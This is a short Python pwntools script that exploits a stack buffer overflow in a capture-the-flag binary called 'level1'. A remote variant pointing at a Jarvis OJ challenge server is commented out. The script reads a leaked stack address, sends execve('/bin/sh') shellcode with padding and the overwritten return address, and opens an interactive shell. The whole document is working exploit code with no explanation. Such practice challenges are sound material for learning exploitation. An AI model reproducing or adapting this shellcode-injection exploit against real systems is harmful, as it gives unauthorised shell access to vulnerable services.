#!/usr/bin/env python
# encoding:utf-8

from pwn import *

distance = 0x88 + 4
shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34";
junk = "A" * (distance - len(shellcode))

Io = process("./level1")
# Io = remote(("pwn2.jarvisoj.com", 9877))
line = Io.readline() # 接受到的数据为 : What's this:0xffe36e40?
address = p32(int(line[len("What's this:"):-2], 16)) # 程序运行之后才可以得到
payload = shellcode + junk + address
Io.write(payload)
Io.interactive()
